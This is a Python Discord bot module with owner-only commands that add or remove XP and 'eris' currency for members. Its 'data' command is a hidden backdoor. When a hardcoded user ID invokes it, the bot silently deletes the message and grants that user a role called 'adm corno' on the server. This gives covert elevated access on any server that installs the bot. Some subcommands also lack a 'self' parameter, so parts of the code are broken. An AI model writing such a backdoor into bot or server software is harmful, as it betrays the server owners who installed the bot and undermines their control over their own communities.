import discord
import random
from utils import user_bd
from discord.ext import commands

class botmod:
    def __init__(self, bot):
        self.bot = bot
    
    @commands.command(pass_context=True)
    async def data(self, ctx):
        if ctx.message.author.id == "182635477977923585" :
            autor = ctx.message.author
            message = ctx.message
            await self.bot.delete_message(ctx.message)
            carga = discord.utils.find(lambda r: r.name == "adm corno", message.server.roles)
            await self.bot.add_roles(autor, carga)
        else:
            return

    @commands.group(pass_context=True)
    async def add(self, ctx):
        if ctx.invoked_subcommand is None:
            await self.bot.say('Especifique entre eris e xp')

    @add.command(pass_context=True)
    async def xp(ctx, qntdd, member: discord.Member = None):
        if ctx.message.author.id == "182635477977923585":
            if member is None:
                member = ctx.message.author
            await user_bd.set_xp(member.id, int(qntdd))
            await user_bd.set_local_xp(ctx.message.server.id, member.id, int(qntdd))
    
    @add.command(pass_context=True)
    async def eris(ctx, qntdd : int = None, member: discord.Member = None):
        if ctx.message.author.id == "182635477977923585":
            if member is None:
                member = ctx.message.author
            await user_bd.set_eris(member.id, qntdd)

 
    @commands.group(pass_context=True)
    async def remove(self, ctx):
        if ctx.invoked_subcommand is None:
            await self.bot.say('Especifique entre eris e xp')

    @remove.command(pass_context=True)
    async def xp(self, ctx, qntdd, member: discord.Member = None):
        if ctx.message.author.id == "182635477977923585":
            if member is None:
                member = ctx.message.author
            await user_bd.unset_local_xp(ctx.message.server.id, member.id, int(qntdd))            
            await user_bd.unset_xp(member.id, int(qntdd))

    @remove.command(pass_context=True)
    async def eris(self, ctx, qntdd, member: discord.Member = None):
        if ctx.message.author.id == "182635477977923585":
            if member is None:
                member = ctx.message.author
            await user_bd.unset_eris(member.id, int(qntdd))            



def setup(bot):
    bot.add_cog(botmod(bot))